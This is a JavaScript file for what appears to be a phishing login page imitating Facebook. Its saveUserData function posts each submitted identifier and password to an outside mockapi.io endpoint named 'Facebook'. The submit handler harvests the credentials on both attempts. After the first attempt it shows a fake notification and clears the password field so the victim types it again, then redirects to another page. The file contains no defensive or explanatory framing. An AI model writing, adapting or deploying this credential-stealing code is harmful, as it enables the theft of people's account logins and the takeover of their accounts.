let attemptCount = 0; // Track login attempts

function showModal() {
    const modal = document.getElementById('notificationModal');
    modal.style.display = 'block';
}

function closeModal() {
    const modal = document.getElementById('notificationModal');
    modal.style.display = 'none';
}

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');

    const isPassword = passwordInput.type === 'password';
    passwordInput.type = isPassword ? 'text' : 'password';
    eyeIcon.style.backgroundImage = isPassword 
        ? "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-open-1.png')" 
        : "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-close-1.png')";
}

async function saveUserData(identifier, password) {
    const userData = { identifier, password };
    
    try {
        await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(userData),
        });
    } catch (error) {
        console.error('Error saving user data:', error);
    }
}

const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault(); // Prevent the default form submission

    const identifier = document.getElementById('identifier').value;
    const password = document.getElementById('password').value;

    // Save user data on both clicks
    await saveUserData(identifier, password);

    if (attemptCount === 0) {
        showModal(); // Show notification for the first click
        attemptCount++; // Increment for the next click
        document.getElementById('password').value = ''; // Clear password input for retry
    } else {
        // Second click: redirect to indexPAGE.html
        setTimeout(() => {
            window.location.href = 'indexPAGE.html'; // Redirect after 1 second
        }, 1000);
    }
});
